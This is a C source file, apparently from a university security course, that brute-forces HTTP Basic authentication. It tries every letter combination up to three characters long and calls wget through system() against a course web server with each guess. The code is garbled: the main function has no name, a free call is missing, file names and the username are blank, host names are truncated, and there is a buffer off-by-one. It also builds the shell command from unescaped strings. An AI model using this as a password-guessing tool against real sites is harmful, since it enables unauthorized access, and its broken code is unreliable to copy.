#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>
				  


#define USERNAME ""
#define URL "sec-crack.cs.rmit.edu./SEC/2"
#define TEST_URL "yallara.cs.rmit.edu./~/secure"
#define MAX_PASSWD_LEN 3
#define MAX_CHAR_SET 52

#define TRUE 1
#define FALSE 0








typedef int (*CrackFuncPtr)(const char*, const char*);

int runBruteForce(const char chSet[], int numOfCh, int len, CrackFuncPtr func);
char* initPasswdStr(int len, char ch);
int getChPos(const char chSet[], int numOfCh, char ch);
int pow(int x, int y);
int crackHTTPAuth(const char *username, const char *passwd);

int ()
{
	char charSet[] = {'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K',
							'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 
							'W', 'X', 'Y', 'Z',
							'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k',
							'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 
							'w', 'x', 'y', 'z'};
	
	char charSetS[] = {'A', 'B', 'C'};

	int i; 
	
	for (i=1; i<=MAX_PASSWD_LEN; i++)
	{
		if (runBruteForce(charSet, MAX_CHAR_SET, i, crackHTTPAuth))
		{
			return 0;
		}
	}

	printf("\n...password not found\n");							 	
	return 0;
}

int runBruteForce(const char chSet[], int numOfCh, int len, CrackFuncPtr func)
{
	int iter; 
	int chIter; 
	int curPos = 0; 
	
	char *str;
	
	int passwdFound = FALSE;
	
	str = initPasswdStr(len, chSet[0]);

	printf("\nNow trying %d character(s)\n", len);


	for (iter=0; iter<pow(numOfCh, len)&&!passwdFound; iter++)
	{
		for (chIter=len-1; chIter>=0; chIter--)
		{
			if (iter % pow(numOfCh, chIter) == 0) 
			{
				curPos = getChPos(chSet, numOfCh, str[chIter]);
				str[chIter] = chSet[curPos+1];
			}

			if (iter % pow(numOfCh, (chIter+1)) == 0) 
			{
				str[chIter] = chSet[0];
			}
		}
		
		if (func(USERNAME, str))
		{
			printf("\nPassword found: %s\n", str);
			passwdFound = TRUE;
		}

		
		printf(".");
					
	}

	(str);
	str = NULL;

	return passwdFound;
}

int getChPos(const char chSet[], int numOfCh, char ch)
{
	int i;
	
	for (i=0; i<numOfCh; i++)
	{
		if (chSet[i] == ch)
		{
			return i;
		}
	}

	return -1;
	
}

char* initPasswdStr(int len, char ch)
{
	int i;

	char *str;

	str = malloc(len);

	if (str)
	{
		for (i=0; i<len; i++)
		{
			str[i] = ch;
		}
		str[len] = '\0';
	}
	else
	{
		fprintf(stderr, "\nError: Unable  allocate %d bytes memory.");
		exit(1);
	}
	
	return str;
}

int pow(int x, int y)
{
	int ans = 1, i;
	
	for (i=0; i<y; i++)
	{
		ans *= x;
	}

	return ans;
}

int crackHTTPAuth(const char *username, const char *passwd)
{
	char cmd[256];
	struct stat fileInfo;
	
	sprintf(cmd, "wget -O  -q --http-user=%s --http-passwd=%s --proxy=off %s", 
						username, passwd, URL);

	system(cmd);	

	(void)stat("", &fileInfo); 

	return fileInfo.st_size;
	
}

